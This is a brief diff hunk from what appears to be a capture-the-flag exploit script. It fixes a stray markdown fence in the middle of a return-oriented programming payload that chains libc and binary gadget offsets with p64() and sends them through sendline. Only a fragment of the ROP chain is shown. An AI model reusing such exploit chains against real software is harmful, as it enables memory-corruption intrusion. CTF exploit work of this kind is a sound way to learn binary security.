@@ -75,7 +75,7 @@ payload += p64(libcbase + RET_OFFSET)
 payload += p64(libcbase + POP_RAX_OFFSET)
 payload += p64(binbase + 0xb4c)
 payload += p64(libcbase + MOV_RDI_RSI_OFFSET)
-```
+
 p.sendline(payload)
 
 p.sendline("end of letter")
